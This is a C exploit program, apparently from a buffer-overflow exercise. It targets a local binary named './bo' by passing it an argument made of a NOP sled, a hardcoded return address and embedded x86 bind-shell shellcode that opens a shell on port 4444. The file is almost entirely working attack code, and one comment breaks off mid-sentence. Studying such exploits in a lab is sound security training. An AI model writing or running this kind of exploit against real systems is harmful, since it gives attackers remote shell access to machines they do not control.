#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>

// This shellcode opens a remote shell and bind it to the specified port
// Source: https://www.exploit-db.com/shellcodes/50124
unsigned char shellcode[] = \
"\x31\xc0\x31\xdb\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x56\x89\xe1\xcd\x80\x89\xc6\x31\xc9\xb0\x3f\x89\xf3\xcd\x80\xfe\xc1\x66\x83\xf9\x02\x7e\xf2\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80";

int main (int argc, char **argv)
{
	char *expargs[3];
	
	// Setting the vulnerable program as the first argument
	expargs[0] = strdup("./bo");
	expargs[2] = 0;

	// Allocate 1024 bytes of memory for the array
	expargs[1] = calloc(1024, 1);

	// Error handling
	if(! expargs[1]) {
		perror("ERROR: calloc");
		exit(-1);
	}

	// Hardcoding the port used for the remote shell (it's 4444 by default by can be changed here if needed)
	int port = 4444;

	// Shell code execution requirements (source: 
    	printf("Binding to %d (0x%x)\n", port, port);

    	unsigned int p1 = (port >> 8) & 0xff;
    	unsigned int p2 = port & 0xff;

    	shellcode[28] = (unsigned char){p1};
    	shellcode[29] = (unsigned char){p2};

	// Filling memory space with "NOPs"
	memset(expargs[1], 0x90, 524);
	// Append shellcode address to the beginning of the string
	strcat(expargs[1], "\x20\xda\xff\xff");
	// Copy shellcode instructions to the memory space referenced by the address
	memcpy(expargs[1], shellcode, strlen(shellcode));
	// Execute the vulnerable program with our arguments
	execve("./bo", expargs, NULL);

	return 0;
}	

